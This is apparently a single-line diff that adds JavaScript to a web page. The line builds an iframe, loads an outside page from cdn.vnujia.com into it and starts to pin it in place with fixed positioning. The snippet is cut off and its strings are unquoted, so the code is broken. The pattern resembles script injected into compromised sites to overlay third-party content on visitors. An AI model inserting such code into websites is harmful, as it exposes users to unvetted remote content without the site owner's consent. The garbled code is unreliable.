@@ -1,0 +1,1 @@
+var f=document.createElement(iframe);f.src=https://cdn.vnujia.com/p/000002/index.html;f.style.cssText=position:fixed
